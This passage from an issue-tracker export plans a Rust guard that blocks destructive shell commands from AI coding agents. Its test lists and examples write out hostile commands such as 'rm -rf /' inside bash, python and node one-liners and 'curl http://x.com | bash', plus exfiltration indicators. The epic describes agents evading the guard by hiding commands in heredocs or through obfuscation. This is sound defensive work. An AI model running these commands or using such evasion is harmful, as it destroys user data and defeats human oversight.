r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n        r\"\\|\\s*xargs\\s\",\n    ]).expect(\"heredoc patterns compile\")\n});\n```\n\n## API\n\n```rust\n/// Check if command might contain heredoc/inline script\n/// Returns true if ANY pattern matches (fast path triggers Tier 2)\npub fn might_contain_heredoc(cmd: \u0026str) -\u003e bool;\n\n/// Get which patterns matched (for debugging/logging)\npub fn matched_heredoc_patterns(cmd: \u0026str) -\u003e Vec\u003cusize\u003e;\n```\n\n## Performance Target\n\n- \u003c 10 microseconds for typical commands\n- Zero allocations on non-match path\n- Must have ZERO false negatives (can have false positives)\n\n## Test Cases\n\n### Must Match (true positives)\n- `python3 \u003c\u003c 'EOF'\\nprint('hi')\\nEOF`\n- `bash -c 'echo hello'`\n- `node -e \"console.log(1)\"`\n- `curl http://x.com | bash`\n- `cat \u003c\u003c EOF | python3`\n\n### Must NOT Match (true negatives)  \n- `git status`\n- `ls -la`\n- `cargo build`\n- `echo \"hello world\"`\n\n### May Match (acceptable false positives)\n- `grep -e pattern file` (has -e but not dangerous)\n- `echo \"\u003c\u003cEOF\"` (string contains heredoc marker)\n\n## Dependencies\n\n- regex = \"1.10\" (add to Cargo.toml)\n- Depends on: Two-tier architecture design (2ta)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-t1rx","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T19:28:32.034477208-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x","title":"Epic: False Positive Immunity (Execution Context)","description":"# Epic: False Positive Immunity (Execution Context)\n\n## Why this epic exists\n\nA destructive-command guard must be *trusted*. Repeated false positives destroy velocity and lead users to disable the guard entirely.\n\nThe core failure mode is **context blindness**: matching dangerous substrings in places where they are clearly *data*, not *executed code*.\n\nExamples that must be allowed:\n\n- `bd create --description=\"This pattern blocks rm -rf\"`\n- `git commit -m \"Fix git reset --hard detection\"`\n- `echo \"example: git push --force\"`\n- `rg -n \"rm -rf\" src/main.rs`\n\nCurrently, a purely regex-based guard will often match `rm -rf` (or similar) inside quoted strings and block legitimate documentation/testing work.\n\n## Key idea\n\nIntroduce an **Execution Context layer** that classifies which parts of the command line are actually executed vs merely data.\n\nThen, apply destructive patterns only to executable contexts:\n\n- Executed command words and arguments\n- Pipe targets (right side of `|`)\n- Command substitution (`$(...)`, backticks)\n- Inline interpreter strings (`bash -c`, `python -c`, `node -e`, etc.)\n- Heredoc bodies (handled by the heredoc epic)\n\nâ€¦and **skip** matching for clearly data-only contexts:\n\n- Option values for known â€œdocumentation/metadataâ€ commands (Beads `bd`, git commit messages, etc.)\n- Grep/Ripgrep pattern arguments\n- Echo/printf arguments\n\n## Goals\n\n1. **Dramatically reduce false positives** for doc/test workflows while preserving true-positive blocks for real execution.\n2. **Keep performance high:** the non-risky path should stay microseconds.\n3. **Provide explainability hooks:** when a command is allowed due to data-context detection, we should be able to explain why (for debugging).\n\n## Architectural constraints\n\n- This layer runs before pack regex evaluation and before AST/heredoc scanning.\n- It must be conservative: if context is ambiguous, treat as executable or escalate to deeper analysis, but avoid blocking obvious documentation strings.\n\n## Acceptance criteria (epic-level)\n\n- The examples in â€œWhy this epic existsâ€ are allowed.\n- Real executions are still blocked:\n  - `bash -c \"rm -rf /\"`\n  - `echo hi | bash -c \"rm -rf /\"`\n  - `python -c \"import os; os.system('rm -rf /')\"`\n- Context classification has regression tests for:\n  - quoting (single/double/escaped)\n  - pipes\n  - command substitution\n  - xargs\n  - interpreter flags (-c/-e/-p)\n\n## Notes for future self\n\n- If we add a â€œwarn modeâ€ or confidence scoring, this epic provides the context signals.\n- Donâ€™t overfit to specific tools; start with a minimal safe-string-arg registry and expand based on real false positives.\n","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T19:57:23.162019558-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:57:23.162019558-05:00"}
{"id":"git_safety_guard-t8x.1","title":"Define Safe String-Argument Registry v1 (commands + flags)","description":"## Objective\n\nCreate a **versioned** registry of commands whose arguments are predominantly *data*, not code, so we can suppress false positives without compromising safety.\n\n## Background\n\nMany developer workflows involve writing *about* dangerous commands:\n\n- issue trackers (`bd create --description=...`)\n- git commit/tag messages (`git commit -m ...`)\n- search tools (`rg -e \"rm -rf\" ...`)\n- printing examples (`echo \"git reset --hard\"`)\n\nWithout recognizing these contexts, regex matching will cause velocity-destroying false positives.\n\n## Scope (v1)\n\nStart with a small, high-value registry:\n\n### Always-data commands\n\n- `echo`, `printf`\n\n### Beads CLI\n\n- `bd create`: `--description`, `--title`, `--notes`\n- `bd update`: `--description`, `--title`, `--notes`\n\n### Git messages\n\n- `git commit -m`, `git commit --message`\n- `git tag -m`, `git tag --message`\n- `git notes add -m`\n\n### Search tools\n\n- `grep` pattern args (`-e`, `--regexp`, `-F`, `--fixed-strings`)\n- `rg` pattern args (`-e`, `--regexp`, `--fixed-strings`)\n\n### Optional candidates (add only with tests)\n\n- `sed` scripts in `-e` (can be code; treat as code, not data)\n- `awk` programs (code; treat as code)\n\n## Design requirements\n\n- Registry must be **explicit and test-driven**.\n- Registry must be conservative: only suppress matching where we are confident strings are not executed.\n- Provide a way to extend the registry via config in the future (but do not over-engineer).\n\n## Acceptance criteria\n\n- Add unit tests for each registry entry demonstrating at least one previously false-positive case that is now allowed.\n- Add at least one counterexample test per category to ensure we do not suppress *real* execution (e.g., `bash -c \"rm -rf /\"` must still be evaluated).\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:02:56.784418941-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:02:56.784418941-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x.1","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:56.795312367-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x.2","title":"Implement execution-context classification (pipes, subst, quoting)","description":"## Objective\n\nImplement a fast execution-context classifier that identifies which parts of a command line are executed vs data.\n\n## Background\n\nA safe-string registry alone is insufficient. We must correctly classify contexts such as:\n\n- pipes: `echo hi | bash -c \"...\"`\n- command substitution: `$(dangerous command)`\n- backticks: `` `dangerous command` ``\n- xargs: `printf '%s\\n' arg1 arg2 | xargs cmd`\n- inline interpreter flags: `bash -c`, `python -c`, `node -e`, etc.\n\nThese contexts are **executable** even if they appear inside quotes.\n\n## SpanKind Enum Definition\n\n```rust\n/// Classification of a command-line span\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\npub enum SpanKind {\n    /// Command word or unquoted argument - fully executed\n    Executed,\n\n    /// Quoted argument to a known-safe command (e.g., git commit -m \"...\")\n    Argument,\n\n    /// Content of -c/-e flags (bash -c, python -c, node -e)\n    /// Must be scanned for destructive patterns\n    InlineCode,\n\n    /// Single-quoted string - no variable substitution possible\n    /// Always safe to skip pattern matching\n    Data,\n\n    /// Heredoc body - escalate to Tier 2/3 analysis\n    HeredocBody,\n\n    /// Ambiguous context - treat as Executed (conservative)\n    Unknown,\n}\n```\n\n## Conservative Design Principle\n\n**\"Ambiguous â†’ Executed\"**\n\nIf classification is uncertain, we MUST NOT suppress pattern matching. The priority order is:\n\n1. **Correctness over convenience**: Never allow a destructive command due to misclassification\n2. **False positives over false negatives**: A blocked safe command is annoying; an allowed destructive command is catastrophic\n3. **Explicit over implicit**: Only suppress matching for contexts we are 100% confident are data\n\n## Quoting Rules\n\n| Quote Type | Contains `$()` or backticks? | Classification |\n|------------|------------------------------|----------------|\n| Single quotes (`'...'`) | N/A (no expansion) | `Data` |\n| Double quotes (`\"...\"`) | No | `Argument` (if safe cmd) or `Unknown` |\n| Double quotes (`\"...\"`) | Yes | `InlineCode` or `Unknown` |\n| Unquoted | - | `Executed` |\n\n## Approach\n\n### Phase 1 (minimal, high ROI)\n\n- Tokenize the shell command line with a small, purpose-built tokenizer:\n  - recognize single quotes, double quotes, backslash escapes\n  - recognize operators: `|`, `\u0026\u0026`, `||`, `;`, `$(...)`, backticks\n  - identify the first word of each pipeline segment as the executed command\n\n### Phase 2 (harder cases)\n\n- Recognize `xargs` invocation patterns where subsequent tokens become executed commands.\n- Recognize `env VAR=... cmd` wrappers.\n- Recognize `sudo` prefix.\n\n### Phase 3 (optional)\n\n- Replace tokenizer with tree-sitter-bash if maintenance burden becomes high.\n\n## Output Model\n\nProduce a lightweight structure:\n\n```rust\npub struct CommandSpans {\n    spans: Vec\u003cSpan\u003e,\n}\n\npub struct Span {\n    pub kind: SpanKind,\n    pub byte_range: std::ops::Range\u003cusize\u003e,\n}\n```\n\nThe decision engine applies pack regexes only to `Executed`/`InlineCode`/`HeredocBody` spans (never to pure `Data`).\n\n## Safety Rules\n\n1. Single quotes are ALWAYS `Data` - no exceptions\n2. Double quotes with command substitution are ALWAYS `Unknown` or `InlineCode`\n3. Pipe targets are ALWAYS `Executed`\n4. Command substitution content is ALWAYS `InlineCode`\n5. Backtick content is ALWAYS `InlineCode`\n\n## Performance Budget\n\n- Classification adds \u003c100Î¼s to typical commands\n- Zero allocations for simple commands (no pipes, no substitution)\n- Early exit for commands that are obviously simple\n\n## Acceptance Criteria\n\n- Unit tests cover:\n  - quoting and escaping\n  - pipes and separators\n  - command substitution and backticks\n  - bash/python/node inline code flags\n- Demonstrate the classifier allows documentation strings but still blocks real executions.\n- Performance: classification adds \u003c100Î¼s to typical commands.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:03:13.621823546-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:20:51.056004789-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x.2","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:03:13.623130597-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x.3","title":"E2E regression: false positives vs real execution contexts","description":"## Objective\n\nExpand end-to-end coverage to ensure the execution-context layer prevents false positives without introducing false negatives.\n\n## Scope\n\nAdd E2E cases for:\n\n### Must ALLOW (data contexts)\n\n- `bd create --description=\"Pattern blocks rm -rf\"`\n- `bd update \u003cid\u003e --notes \"example: git reset --hard\"`\n- `git commit -m \"Fix git push --force detection\"`\n- `git tag -m \"Document rm -rf\" v1.2.3`\n- `echo \"example: kubectl delete namespace prod\"`\n- `rg -n \"rm -rf\" src/main.rs`\n- `grep -e \"DROP TABLE\" schema.sql`\n\n### Must BLOCK (executed contexts)\n\n- `bash -c \"rm -rf /\"`\n- `echo hi | bash -c \"rm -rf /\"`\n- `python -c \"import os; os.system('rm -rf /')\"`\n- `node -e \"require('child_process').execSync('rm -rf /')\"`\n- `echo $(rm -rf /tmp/foo)` (command substitution)\n- ``echo `rm -rf /tmp/foo` `` (backticks)\n\n### Edge cases\n\n- mixed quoting and escapes\n- `sudo` prefix\n- `env VAR=... bash -c ...`\n\n## Logging requirements\n\n- E2E runner must print for each test:\n  - description\n  - command (possibly truncated)\n  - expected allow/block\n  - actual decision\n  - if blocked: pack_id/pattern_name (once available)\n\n## Acceptance criteria\n\n- E2E suite runs in CI and produces a clear failure summary listing failed cases.\n- At least one test proves that docs strings containing dangerous substrings are allowed.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:03:29.812660747-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:03:29.812660747-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x.3","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:03:29.813900562-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-t8x.3","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:09:05.564047374-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-tlog","title":"Add detailed tracing and logging for heredoc detection","description":"# Tracing and Logging Implementation\n\n## Objective\n\nAdd comprehensive tracing using the `tracing` crate to enable debugging and monitoring of heredoc detection.\n\n## Dependencies to Add\n\n```toml\n[dependencies]\ntracing = \"0.1\"\ntracing-subscriber = { version = \"0.3\", features = [\"env-filter\"] }\n```\n\n## Log Levels\n\n- **ERROR**: Parsing failures, timeout exceeded\n- **WARN**: Fallback triggered, unknown language\n- **INFO**: Heredoc detected, command blocked/allowed\n- **DEBUG**: Pattern matches, timing details\n- **TRACE**: Full command text, AST details\n\n## Instrumentation Points\n\n### 1. Main Check Flow\n\n```rust\n#[tracing::instrument(skip(cmd), fields(cmd_len = cmd.len()))]\npub fn check_command(cmd: \u0026str) -\u003e CheckResult {\n    let start = Instant::now();\n    \n    // Quick reject\n    if global_quick_reject(cmd) {\n        tracing::trace!(\"quick_reject: no relevant keywords\");\n        return CheckResult::allowed();\n    }\n    \n    // Heredoc detection\n    if might_contain_heredoc(cmd) {\n        tracing::debug!(\"heredoc_detected: triggering Tier 2 analysis\");\n        if let Some(result) = check_heredoc(cmd) {\n            tracing::info!(\n                blocked = result.blocked,\n                reason = ?result.reason,\n                elapsed_us = start.elapsed().as_micros(),\n                \"heredoc_check_complete\"\n            );\n            return result;\n        }\n    }\n    \n    // Pattern matching...\n}\n```\n\n### 2. Heredoc Analysis\n\n```rust\n#[tracing::instrument(skip(cmd))]\nfn check_heredoc(cmd: \u0026str) -\u003e Option\u003cCheckResult\u003e {\n    let extraction_start = Instant::now();\n    let heredoc = extract_heredoc(cmd)?;\n    tracing::debug!(\n        extraction_us = extraction_start.elapsed().as_micros(),\n        content_len = heredoc.content.len(),\n        \"heredoc_extracted\"\n    );\n    \n    let lang = detect_language(\u0026heredoc);\n    tracing::debug!(language = ?lang, \"language_detected\");\n    \n    let parse_start = Instant::now();\n    let matches = match_patterns(\u0026heredoc.content, lang);\n    tracing::debug!(\n        parse_us = parse_start.elapsed().as_micros(),\n        match_count = matches.len(),\n        \"patterns_checked\"\n    );\n    \n    // ...\n}\n```\n\n### 3. Error Handling\n\n```rust\nmatch parse_with_ast_grep(\u0026content, lang) {\n    Ok(ast) =\u003e { /* ... */ }\n    Err(e) =\u003e {\n        tracing::warn!(\n            error = %e,\n            language = ?lang,\n            \"ast_parse_failed: falling back to allow\"\n        );\n        return None;  // Fail-open\n    }\n}\n```\n\n## Environment Variable Control\n\n```bash\n# Enable all heredoc tracing\nRUST_LOG=dcg::heredoc=debug dcg check\n\n# Enable timing info only\nRUST_LOG=dcg=info dcg check\n\n# Full trace (very verbose)\nRUST_LOG=dcg=trace dcg check\n```\n\n## JSON Structured Logging\n\nFor machine parsing:\n\n```rust\ntracing_subscriber::fmt()\n    .json()\n    .with_env_filter(EnvFilter::from_default_env())\n    .init();\n```\n\nOutput:\n```json\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"DEBUG\",\"target\":\"dcg::heredoc\",\"message\":\"heredoc_detected\",\"cmd_len\":156,\"tier\":1}\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"DEBUG\",\"target\":\"dcg::heredoc\",\"message\":\"language_detected\",\"language\":\"Python\"}\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"INFO\",\"target\":\"dcg::heredoc\",\"message\":\"command_blocked\",\"reason\":\"os.system with shell command\",\"elapsed_us\":1234}\n```\n\n## Performance Impact\n\n- Logging disabled: Zero overhead (tracing uses static dispatch)\n- INFO level: \u003c 1Î¼s per log call\n- DEBUG level: \u003c 5Î¼s per log call\n- TRACE level: Variable (includes data serialization)\n\n## Test Verification\n\nAdd tests that verify logging output:\n\n```rust\n#[test]\nfn test_heredoc_logging() {\n    let (writer, handle) = tracing_test::subscriber();\n    tracing::subscriber::with_default(writer, || {\n        check_command(\"python3 \u003c\u003c 'EOF'\\nimport os\\nos.system('rm -rf /')\\nEOF\");\n    });\n    \n    let logs = handle.into_string();\n    assert!(logs.contains(\"heredoc_detected\"));\n    assert!(logs.contains(\"language_detected\"));\n    assert!(logs.contains(\"Python\"));\n}","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-tlog","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:33.00690866-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-tlog","depends_on_id":"git_safety_guard-1gt.4","type":"relates-to","created_at":"2026-01-07T20:11:15.436832681-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-uau","title":"Define Bash/Shell destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Bash/Shell constructs within heredoc bodies.\n\n## Why This Matters\n\nBash heredocs are the most common attack vector because:\n1. bash -c, sh -c are extremely common command forms\n2. Shell scripts can invoke ANY system command\n3. Existing dcg regex patterns already target many shell commands - we need equivalent AST patterns\n\n## Pattern Categories to Define\n\n### File/Directory Destruction\n- recursive forced removal patterns\n- rmdir on critical directories\n- find with delete patterns\n- Wildcards in destructive contexts\n\n### Git Destructive Operations\n- hard reset patterns\n- forced clean patterns\n- force push to protected branches\n- force branch deletion\n\n### Permission/Ownership Changes\n- chmod 777 on system paths\n- chown root or changing critical file ownership\n- setfacl manipulations\n\n### System Administration\n- mkfs, fdisk, dd commands on devices\n- service/systemctl stop on critical services\n- kill -9 on system processes\n- shutdown, reboot, halt\n\n### Data Exfiltration Indicators\n- curl/wget piped to shell\n- base64 encoding of sensitive files\n- tar/zip of home directories or /etc\n\n## Implementation Notes\n\nShell parsing is complex due to:\n- Quoting rules (single, double, command substitution)\n- Variable expansion\n- Command substitution\n- Heredocs within heredocs\n- Arrays and special variables\n\nStart with tree-sitter-bash and test each pattern against real shell scripts to validate accuracy.\n\n## Test Cases\n\nEach pattern needs positive tests (should match) and negative tests (should not match) covering:\n- Common benign uses that look similar\n- Quoting variations\n- Variable indirection\n- Command aliasing\n\n## Dependencies\n\n- Pattern library structure design (how patterns are organized)\n- ast-grep invocation layer (how to run ast-grep on content)\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:34:59.51511691-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:35:04.976948155-05:00","dependencies":[{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:35:11.201594037-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:35:11.220201218-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-unit","title":"Create comprehensive unit test suite for heredoc detection","description":"# Unit Test Suite for Heredoc Detection\n\n## Objective\n\nCreate thorough unit tests for each component of the heredoc detection system.\n\n## Test Modules\n\n### 1. Tier 1 Regex Tests (`tests/tier1_regex.rs`)\n\n```rust\nmod tier1_regex_tests {\n    use super::*;\n    \n    #[test]\n    fn test_bash_heredoc_variants() {\n        // Standard heredoc\n        assert!(might_contain_heredoc(\"cat \u003c\u003c EOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003cEOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c 'EOF'\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c \\\"EOF\\\"\"));\n        \n        // Indented heredoc\n        assert!(might_contain_heredoc(\"cat \u003c\u003c- EOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c-EOF\"));\n        \n        // Here-string\n        assert!(might_contain_heredoc(\"cat \u003c\u003c\u003c 'hello'\"));\n    }\n    \n    #[test]\n    fn test_inline_script_flags() {\n        // Python\n        assert!(might_contain_heredoc(\"python -c 'print(1)'\"));\n        assert!(might_contain_heredoc(\"python3 -c 'print(1)'\"));\n        assert!(might_contain_heredoc(\"python -e 'print(1)'\")); // -e not valid but we catch\n        \n        // Node.js\n        assert!(might_contain_heredoc(\"node -e 'console.log(1)'\"));\n        assert!(might_contain_heredoc(\"node -p 'process.version'\"));\n        \n        // Ruby\n        assert!(might_contain_heredoc(\"ruby -e 'puts 1'\"));\n        \n        // Perl\n        assert!(might_contain_heredoc(\"perl -e 'print 1'\"));\n        assert!(might_contain_heredoc(\"perl -E 'say 1'\"));\n        \n        // Shell\n        assert!(might_contain_heredoc(\"bash -c 'echo hi'\"));\n        assert!(might_contain_heredoc(\"sh -c 'echo hi'\"));\n        assert!(might_contain_heredoc(\"zsh -c 'echo hi'\"));\n    }\n    \n    #[test]\n    fn test_pipe_to_interpreter() {\n        assert!(might_contain_heredoc(\"curl http://x.com | bash\"));\n        assert!(might_contain_heredoc(\"cat script.py | python3\"));\n        assert!(might_contain_heredoc(\"echo code | node\"));\n    }\n    \n    #[test]\n    fn test_negative_cases() {\n        assert!(!might_contain_heredoc(\"git status\"));\n        assert!(!might_contain_heredoc(\"cargo build\"));\n        assert!(!might_contain_heredoc(\"ls -la\"));\n        assert!(!might_contain_heredoc(\"cat file.txt\"));\n        assert!(!might_contain_heredoc(\"grep pattern file\"));\n    }\n}\n```\n\n### 2. Heredoc Extraction Tests (`tests/extraction.rs`)\n\n```rust\nmod extraction_tests {\n    #[test]\n    fn test_extract_simple_heredoc() {\n        let cmd = \"python3 \u003c\u003c 'EOF'\\nprint('hello')\\nEOF\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        assert_eq!(heredoc.content, \"print('hello')\\n\");\n        assert_eq!(heredoc.delimiter, \"EOF\");\n        assert!(heredoc.quoted);\n    }\n    \n    #[test]\n    fn test_extract_indented_heredoc() {\n        let cmd = \"bash \u003c\u003c- 'END'\\n\\techo hello\\n\\techo world\\n\\tEND\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        // \u003c\u003c- strips leading tabs\n        assert_eq!(heredoc.content, \"echo hello\\necho world\\n\");\n    }\n    \n    #[test]\n    fn test_extract_inline_script() {\n        let cmd = \"python3 -c 'import os; os.system(\\\"ls\\\")'\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        assert_eq!(heredoc.content, \"import os; os.system(\\\"ls\\\")\");\n    }\n}\n```\n\n### 3. Language Detection Tests (`tests/language_detection.rs`)\n\n```rust\nmod language_detection_tests {\n    #[test]\n    fn test_detect_from_command() {\n        assert_eq!(detect_language_from_cmd(\"python3 -c\"), Language::Python);\n        assert_eq!(detect_language_from_cmd(\"node -e\"), Language::JavaScript);\n        assert_eq!(detect_language_from_cmd(\"ruby -e\"), Language::Ruby);\n        assert_eq!(detect_language_from_cmd(\"perl -e\"), Language::Perl);\n        assert_eq!(detect_language_from_cmd(\"bash -c\"), Language::Bash);\n    }\n    \n    #[test]\n    fn test_detect_from_shebang() {\n        assert_eq!(detect_language_from_content(\"#!/usr/bin/env python3\\n\"), Language::Python);\n        assert_eq!(detect_language_from_content(\"#!/bin/bash\\n\"), Language::Bash);\n        assert_eq!(detect_language_from_content(\"#!/usr/bin/node\\n\"), Language::JavaScript);\n    }\n    \n    #[test]\n    fn test_detect_from_content_heuristics() {\n        assert_eq!(detect_language_from_content(\"import os\\n\"), Language::Python);\n        assert_eq!(detect_language_from_content(\"require('fs')\\n\"), Language::JavaScript);\n        assert_eq!(detect_language_from_content(\"use strict;\\n\"), Language::Perl);\n    }\n}\n```\n\n### 4. Pattern Matching Tests (`tests/patterns.rs`)\n\nOne submodule per language with comprehensive tests.\n\n### 5. False Positive Tests (`tests/false_positives.rs`)\n\n```rust\nmod false_positive_tests {\n    #[test]\n    fn test_documentation_allowed() {\n        // These should NOT be blocked\n        assert!(check_command(\"bd create --description='blocks rm -rf'\").is_allowed());\n        assert!(check_command(\"git commit -m 'fix rm -rf detection'\").is_allowed());\n        assert!(check_command(\"grep 'rm -rf' src/\").is_allowed());\n    }\n}\n```\n\n## Coverage Requirements\n\n- Line coverage: \u003e 90%\n- Branch coverage: \u003e 85%\n- All public functions have tests\n- All error paths tested","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:15:47.843153995-05:00","closed_at":"2026-01-07T21:15:47.843153995-05:00","close_reason":"Duplicate; consolidated into git_safety_guard-8wt","dependencies":[{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:33.163885724-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T19:28:33.346249627-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:28:33.507729581-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T19:28:33.663971771-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-y4j","title":"Implement heredoc content extraction","description":"# Implement Heredoc Content Extraction\n\n## Objective\nExtract the actual script content from detected heredocs for scanning.\n\n## Background\nOnce we detect a heredoc is present, we need to accurately extract its content. This is more complex than detection because we must:\n1. Identify the delimiter\n2. Find the matching end delimiter\n3. Handle quoting and expansion rules\n4. Preserve or strip indentation as appropriate\n\n## Implementation Details\n\n### Heredoc Extraction Logic\n\n```rust\npub struct HeredocContent {\n    /// The extracted script content\n    pub content: String,\n    /// Detected or inferred language\n    pub language: Option\u003cLanguage\u003e,\n    /// Original delimiter used\n    pub delimiter: String,\n    /// Whether the delimiter was quoted (no expansion)\n    pub quoted: bool,\n    /// Byte offset in original command\n    pub start_offset: usize,\n    pub end_offset: usize,\n}\n\npub fn extract_heredoc(cmd: \u0026str) -\u003e Option\u003cHeredocContent\u003e {\n    // 1. Find heredoc start pattern\n    // 2. Extract delimiter (handle quoting)\n    // 3. Find matching end delimiter\n    // 4. Extract content between\n    // 5. Apply indentation rules for \u003c\u003c-\n}\n```\n\n### Delimiter Handling\n- Unquoted: EOF, END, SCRIPT\n- Single-quoted: 'EOF', 'END'\n- Double-quoted: \"EOF\", \"END\"\n- Backtick-quoted: \\`EOF\\` (rare)\n\n### Indentation Rules\n- Standard \u003c\u003c: preserve all indentation\n- Tab-stripped \u003c\u003c-: remove leading tabs from content AND delimiter\n- Zsh \u003c\u003c~: remove common leading whitespace\n\n### Edge Cases\n- Multiple heredocs in one command\n- Nested command substitution containing heredocs\n- Empty heredocs\n- Heredocs with embedded quotes\n- Heredocs that span multiple lines of piped commands\n\n### Inline Script Extraction (Non-Heredoc)\nAlso handle -c/-e style inline scripts:\n```\npython -c \"import os; os.system('...')\"\nnode -e \"require('fs').rmSync('/')\"\n```\n\n## Files to Modify\n- New: src/heredoc/extract.rs\n- src/heredoc/mod.rs\n\n## Testing\n- Test each delimiter quoting style\n- Test \u003c\u003c, \u003c\u003c-, \u003c\u003c~ variants\n- Test inline -c/-e scripts\n- Test edge cases (empty, nested, multiple)\n- Test error handling for malformed heredocs\n\n## Dependencies\n- Implement heredoc detection (git_safety_guard-49s)\n\n## Success Criteria\n- Correctly extract content from all supported heredoc forms\n- Handle edge cases gracefully (no panics)\n- Clear error messages for malformed input","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:31:21.081724798-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:31:21.081724798-05:00","dependencies":[{"issue_id":"git_safety_guard-y4j","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:31:27.231452201-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-yza","title":"Epic: ast-grep Integration for Heredoc Detection","description":"# Epic: ast-grep Integration for Heredoc Detection\n\n## Problem Statement\n\nAI coding agents sometimes attempt to bypass destructive command guards by embedding dangerous commands inside heredoc scripts. The current dcg implementation only examines the top-level command, missing destructive patterns hidden within inline scripts.\n\n### Example Attack Vectors\n\nAn attacker might use Python, Bash, Node.js, or other language heredocs to embed dangerous operations that slip past the quick-reject filter. The top-level command appears benign (e.g., \"python3 \u003c\u003c EOF\") while the heredoc body contains destructive operations.\n\n## Solution Overview\n\nIntegrate ast-grep (or tree-sitter directly) to:\n1. Detect heredoc patterns in commands\n2. Extract embedded script content\n3. Parse the script according to its detected language\n4. Check for destructive patterns within the parsed AST\n5. Block if dangerous patterns are found\n\n## Why ast-grep?\n\nast-grep uses tree-sitter for parsing, providing:\n- **Structural awareness**: Understands code structure, not just text patterns\n- **Language support**: Handles Python, Bash, JavaScript, TypeScript, Ruby, Perl, and many more\n- **Pattern matching**: Powerful AST pattern matching syntax\n- **Battle-tested**: Used in production for large-scale code search and refactoring\n\n## Key Technical Challenges\n\n1. **Heredoc Syntax Variants**: Many forms exist (\u003c\u003c, \u003c\u003c-, \u003c\u003c\u003c, \u003c\u003c~, quoted vs unquoted delimiters)\n2. **Language Detection**: Must infer language from command prefix, shebang, or heuristics\n3. **Performance**: Every command passes through dcg; parsing must be fast\n4. **Pattern Library**: Need comprehensive patterns per language for destructive operations\n5. **Obfuscation**: Attackers might use encoding, string concatenation, or indirect execution\n\n## Success Criteria\n\n- Detect and block heredoc-embedded destructive commands\n- Minimal latency impact (under 10ms for heredoc detection, under 50ms for full parsing)\n- Support Python, Bash, JavaScript/TypeScript, Ruby, Perl at minimum\n- Configurable via pack system (heredoc scanning can be enabled/disabled)\n- Comprehensive test coverage for bypass attempts\n\n## Architecture Decision\n\nWe will evaluate two integration approaches:\n1. **External binary**: Call ast-grep CLI and parse JSON output\n2. **Library integration**: Use tree-sitter Rust bindings directly\n\nThe decision will be made in the research phase based on:\n- Performance benchmarks\n- Dependency complexity\n- Maintenance burden\n- Pattern expressiveness\n\n## Out of Scope (for initial implementation)\n\n- Scanning files referenced in commands (e.g., \"bash script.sh\")\n- Deep obfuscation detection (base64, rot13, etc.)\n- Network-based command retrieval (\"curl ... | bash\" style)\n- 